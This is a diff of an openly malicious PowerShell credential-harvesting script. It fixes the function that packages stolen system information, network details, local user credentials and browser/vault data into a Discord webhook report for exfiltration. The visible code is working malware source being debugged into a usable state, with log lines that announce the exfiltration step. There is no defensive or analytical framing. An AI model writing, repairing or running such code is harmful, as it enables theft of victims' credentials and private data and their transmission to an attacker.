@@ -61,39 +61,30 @@ Function Get-BrowserCredentialDump {
     }
 }
 
-# =========================================================
-# --- 3. WEBHOOK TRANSMISSION LOGIC (FIXED) ---
+# =================================================================
+# --- 3. WEBHOOK TRANSMISSION LOGIC (FIXED hopefully) ---
 # =========================================================
 Function Send-WebhookReport {
     param(
         [Parameter(Mandatory=$true)]
-        [psobject]$AllData # <-- CHANGED: Accepting $AllData object directly
+        [psobject]$AllData # <-- Accepting $AllData object directly
     )
     Write-Host "[+] [EXFILTRATION] Attempting to send structured data via Discord Webhook..." -ForegroundColor Magenta
 
-    # Building the message body structure
+    # --- FIX APPLIED HERE: Restructuring the Embeds object to eliminate duplicate 'fields' ---
     $Body = @{
         content = "✅ Credentials Harvest Complete. A detailed report is embedded below."
         embeds = @{
             title = "SYSTEM_HARVEST_REPORT_V1.0"
-            description = "The embedded payload contains encrypted system artifacts, user credentials, and process data."
+            description = "The embedded payload contains system artifacts, user credentials, and process data."
             color = 16776960 
-            fields = @{
-                Name = "System OS Info"; 
-                Value = $AllData.SystemInfo.OS | Out-String # Accessing nested property
-            }
-            fields = @{
-                Name = "Network Context"; 
-                Value = $AllData.NetworkIP | Out-String
-            }
-            fields = @{
-                Name = "Local User Credentials"; 
-                Value = $AllData.LocalCreds | Out-String
-            }
-            fields = @{
-                Name = "Browser/Vault Status"; 
-                Value = $AllData.BrowserVault | Out-String
-            }
+            # We list all the required fields sequentially, making sure each key is unique.
+            fields = @(
+                [PSObject]@{Name = "System OS Info"; Value = $AllData.SystemInfo.OS | Out-String},
+                [PSObject]@{Name = "Network Context"; Value = $AllData.NetworkIP | Out-String},
+                [PSObject]@{Name = "Local User Credentials"; Value = $AllData.LocalCreds | Out-String},
+                [PSObject]@{Name = "Browser/Vault Status"; Value = $AllData.BrowserVault | Out-String}
+            )
         }
     } | ConvertTo-Json
 
